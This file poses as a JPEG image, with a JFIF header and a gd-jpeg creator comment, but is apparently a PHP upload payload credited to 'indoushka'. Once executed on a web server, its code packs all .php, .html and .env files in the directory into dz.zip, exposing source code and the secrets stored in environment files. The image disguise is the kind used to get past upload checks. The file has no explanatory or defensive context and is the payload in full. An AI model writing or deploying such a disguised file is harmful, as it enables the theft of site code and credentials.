ÿØÿà JFIF  ` `  ÿþ ;CREATOR: gd-jpeg v0.1 (using IJG JPEG v62),
Author : indoushka 
<?php
$zip = new ZipArchive();
$ret = $zip->open('dz.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
if ($ret !== TRUE) {
    printf('Failed with code %d', $ret);
} else {
    $directory = realpath('.');
    $options = array('add_path' => 'sources/');
    $zip->addPattern('/\.(?:php|html|env)$/', $directory, $options);
    $zip->close();
}
?>